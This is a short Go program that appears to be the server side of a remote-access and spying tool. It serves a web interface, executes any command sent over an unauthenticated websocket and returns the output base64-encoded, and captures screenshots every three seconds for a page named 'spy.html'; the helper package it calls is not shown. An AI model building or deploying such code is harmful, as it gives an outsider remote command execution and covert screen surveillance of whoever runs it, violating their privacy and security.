package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"os/exec"
	"github.com/gorilla/websocket"
	"time"
	"./util"

	b64 "encoding/base64"
)

var upgrader = websocket.Upgrader{}

func main() {

	http.Handle("/", http.FileServer(http.Dir("site/")))

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		var conn, _ = upgrader.Upgrade(w, r, nil)
		fmt.Println("Client connection")

		// Accept websocket requests (loop)
		go func(conn *websocket.Conn) {
			for {
				_, p, err := conn.ReadMessage()
				if err != nil {
					return
				}
				
				if string(p) == "getDashboardData" {
					// index.html
					conn.WriteMessage(1, []byte(runCom("ls -lah")))
				} else {
					// cmd.html
					out, err := util.Execute(string(p))
					if err != nil {
						fmt.Println(err)
					}
					conn.WriteMessage(1, []byte(b64.StdEncoding.EncodeToString([]byte(out))))
				}
				
			}
		}(conn)

		// Continually capture screenshots for spy.html
		go func(interval time.Duration) {
			for {
				time.Sleep(3 * time.Second)
				util.CaptureScreen()
			}
		}(3)

	})
	fmt.Println("Server started")
	http.ListenAndServe(":8080", nil)
	fmt.Println("Server crashed")
}

func fileToBytes(f string) []byte {
	b, err := ioutil.ReadFile(f)
	if err != nil {
		panic(err)
	}
	return b
}

func runCom(cmd string) string {
	parts := strings.Fields(cmd)
	head := parts[0]
	parts = parts[1:len(parts)]

	out, err := exec.Command(head,parts...).Output()
	if err != nil {
		fmt.Printf("%s", err)
	}
	return b64.StdEncoding.EncodeToString([]byte(out))
}
